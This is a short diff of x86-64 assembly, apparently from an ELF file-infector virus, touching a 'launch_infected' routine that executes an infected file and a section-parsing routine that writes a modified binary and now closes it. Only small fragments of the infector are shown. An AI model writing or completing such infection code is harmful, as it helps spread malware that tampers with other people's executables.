@@ -628,9 +628,9 @@ retn
 ;void launch_infected(char *fname)
 ;basically execve(fname, {fname, NULL}, {NULL});
 launch_infected:
-;	call ft_puts
-;	call debug
-;	call print_cwd
+	call ft_puts
+	call debug
+	call print_cwd
 	sub rsp, 16; {fname, NULL}
 
 	mov QWORD[rsp], rdi
@@ -1779,6 +1779,9 @@ parse64elfsec:
 	sub rdx, QWORD[rsp + 8]; fsize - new_sect
 	mov rax, 1
 	syscall;write(wfd, file + new_sect, fsize - new_sect);
+	mov rax, 3
+	syscall; close(wfd)
+
 	add rsp, 8
 	add rsp, 8
 	add rsp, 8
